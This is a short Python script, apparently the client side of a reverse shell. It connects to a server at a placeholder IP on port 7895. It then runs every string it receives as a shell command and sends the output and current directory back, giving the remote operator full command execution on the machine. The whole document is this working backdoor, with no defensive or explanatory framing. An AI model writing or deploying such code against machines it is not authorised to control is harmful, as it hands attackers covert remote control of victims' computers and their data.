import  socket
import os
import subprocess
from sys import stdout 


s=socket.socket()
host='ip'        #replace ip with the server pc's ip address
port= 7895

s.connect((host,port))


while True:
    data=s.recv(1024)                      #this is to recive data
    if data[:2].decode('utf-8')=='cd':
        os.chdir(data[3:].decode('utf-8'))
    
    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE) #this allow you to use cmd prompt in clients PC
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte,"utf-8")        #this is to collect and send data to server pc
        currentWD = os.getcwd() + "> "
        s.send(str.encode(output_str + currentWD))
        